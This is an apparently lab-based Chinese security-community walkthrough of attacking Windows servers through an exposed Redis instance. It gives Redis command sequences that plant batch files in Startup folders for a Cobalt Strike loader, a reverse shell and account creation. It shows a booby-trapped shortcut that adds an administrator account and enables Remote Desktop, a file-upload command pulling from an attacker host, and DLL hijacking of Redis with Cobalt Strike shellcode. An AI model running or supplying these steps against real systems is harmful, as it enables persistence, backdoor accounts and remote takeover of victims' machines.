# redis安全攻防-windows-先知社区

> **来源**: https://xz.aliyun.com/news/17513  
> **文章ID**: 17513

---

**@人保集团网络安全攻防实验室**

# Windows写启动项

由于Windows环境对Redis的getshell并不友好，很多操作并不是直接getshell，可能需要利用Redis写入二进制文件、快捷方式等。

启动项写在下面2个目录中的哪个都行

```
C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/
C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp
```

## 写入文件

写入CS的web\_deliver，再写入一个反弹shell的powshell，再写入一个新增用户的bat

```
config set dir "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" 
config set dbfilename cs.bat
set x "\r
\r
powershell.exe xxxxx"\r
\r
"
save

config set dbfilename reverse.bat
set x "\r
\r
xxxxxxx\r
\r
"


config set dbfilename add_user.bat
set x "\r
\r\xxxxxx\r
\r
"
save
```

![image.png](images/20250402172901-e9a2ae9f-0fa4-1.png)

## 阅读写入的文件

查看脚本全部写入。

![image.png](images/img_17513_001.png)

## 执行结果

手动重启靶机后，CS上线成功，添加用户成功。

![image.png](images/20250402172911-ef983309-0fa4-1.png)

![image.png](images/20250402172915-f1c6bfbe-0fa4-1.png)

1. 首先在目标桌面创建notepad++的快捷方式

![image.png](images/20250402172916-f23838f6-0fa4-1.png)

2. 把notepad++的快捷方式修改一下，发现修改后文件图标发生变化。

```
C:\Windows\System32\cmd.exe /c calc & "C:\Program Files\Notepad++
otepad++.exe"
```

![image.png](images/20250402172916-f29a9826-0fa4-1.png)

3. 开始覆盖

篡改过的快捷方式放到kali里面。

![image.png](images/20250402172924-f7554ac4-0fa4-1.png)

4. 效果演示

![image.png](images/20250402172930-fad96152-0fa4-1.png)

5. 直接创建一个快捷方式

![image.png](images/20250402172938-ff90862e-0fa4-1.png)

![image.png](images/20250402172947-0501845b-0fa5-1.png)

# 快捷方式覆盖

**恶意CMD演示**

1. 执行恶意cmd命令，创建账号，打开远程桌面

对1.txt创建快捷方式，修改快捷方式名，修改图标，填写恶意目标内容

```
C:\Windows\System32\cmd.exe /c net user x p@ssword /add&net localgroup Administrators x /add & REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

![image.png](images/20250402172950-06facd31-0fa5-1.png)

2. 上传恶意快捷方式

```
proxychains -q python RedisWriteFile.py --rhost=127.0.0.1 --rport=6379 --lhost=192.168.10.130 --lport=4455 --rpath="C:/Users/Administrator/Desktop" --rfile="iexplore.exe.lnk" --lfile="iexplore.exe.lnk"
```

![image.png](images/20250402173019-17d1cdf0-0fa5-1.png)

3. 手动触发，符合预期效果。

![123.gif](images/20250402173052-2bf1ffad-0fa5-1.gif)

# Windows DLL劫持

### 出网：Cobalt Strike

介绍通过Cobalt Strike生成恶意的C语言文件，完成攻击

工具下载地址：<https://github.com/P4r4d1se/dll_hijack>

1. 获取redis的安装路径

连接redis，执行info命令，通过config\_file能看到路径

![image.png](images/20250402173153-500ed038-0fa5-1.png)

2. 准备VScode

下载安装VS2022：<https://visualstudio.microsoft.com/zh-hans/downloads>  
只用勾C++桌面开发：  
![20240513000734-beaa9fd6-1079-1.png](images/20250402173204-5693283f-0fa5-1.png)  
打开生成目录里的sln文件，打开源文件dllmain.app，修改shellocde和劫持的地址：

![image.png](images/20250402173206-580a846e-0fa5-1.png)

![image.png](images/20250402173209-59981033-0fa5-1.png)

3. CS生成C语言的payload：

![image.png](images/20250402173212-5b5140b1-0fa5-1.png)

把dllmain.app里的payload替换，然后选Release x64，生成解决方案：

![image.png](images/20250402173214-5c88bd48-0fa5-1.png)

4. 写入dll文件

使用RedisWriteFile写入文件。需要使用[redis-dump-go](https://github.com/yannh/redis-dump-go)

![image.png](images/img_17513_019.png)

​

```
proxychains -q python RedisWriteFile.py --rhost=127.0.0.1 --rport=6379 --lhost=192.168.10.130 --rpath="C:/Users/Administrator/Desktop/Redis-x64-5.0.14.1" --rfile="dbghelp.dll" --lfile=dbghelp.dll

bgsave
```

![image.png](images/20250402173232-6769c7c2-0fa5-1.png)

此时cs马已上线。

![image.png](images/20250402173243-6dd48f02-0fa5-1.png)
